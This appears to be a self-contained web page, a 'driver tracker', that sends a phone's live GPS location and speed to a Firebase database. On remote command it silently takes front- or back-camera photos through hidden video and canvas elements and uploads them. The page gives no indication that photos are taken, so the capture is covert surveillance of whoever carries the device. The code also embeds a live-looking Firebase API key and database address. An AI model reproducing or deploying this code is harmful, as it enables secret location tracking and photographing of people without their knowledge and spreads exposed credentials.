<!DOCTYPE html>
<html>
<head>
    <title>Free Tracker - Driver</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
</head>
<body style="background:#121212; color:white; text-align:center; font-family:sans-serif; padding:20px;">
    <h2>Tracking Active</h2>
    <div id="status" style="font-size: 20px; margin-top: 20px;">GPS Dhund raha hai...</div>
    <p id="coords" style="color: #888; font-size: 14px;"></p>
    
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCWUrPm4JaKr0qDbVB_ukOSFMkSmLiYals",
            databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com",
            projectId: "mytrecker2-b3535",
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 1. Live Location
        navigator.geolocation.watchPosition((pos) => {
            db.ref('vehicles/car_01').update({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                speed: Math.round(pos.coords.speed * 3.6) || 0,
                last_seen: new Date().toLocaleTimeString()
            });
            document.getElementById('status').innerText = "ðŸŸ¢ System Active";
            document.getElementById('coords').innerText = "Lat: " + pos.coords.latitude.toFixed(4) + ", Lng: " + pos.coords.longitude.toFixed(4);
        }, null, { enableHighAccuracy: true });

        // 2. Camera Logic with Front/Back support
        db.ref('commands/car_01/action').on('value', (snap) => {
            const cmd = snap.val();
            if(cmd === "take_photo_front") capturePhoto("user");
            if(cmd === "take_photo_back") capturePhoto("environment");
        });

        async function capturePhoto(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 320; canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                    const imageData = canvas.toDataURL('image/jpeg', 0.5); 
                    
                    db.ref('vehicles/car_01/photo').set(imageData); 
                    db.ref('commands/car_01/action').set("idle");
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);
            } catch (e) {
                db.ref('commands/car_01/action').set("error");
            }
        }
    </script>
</body>
</html>
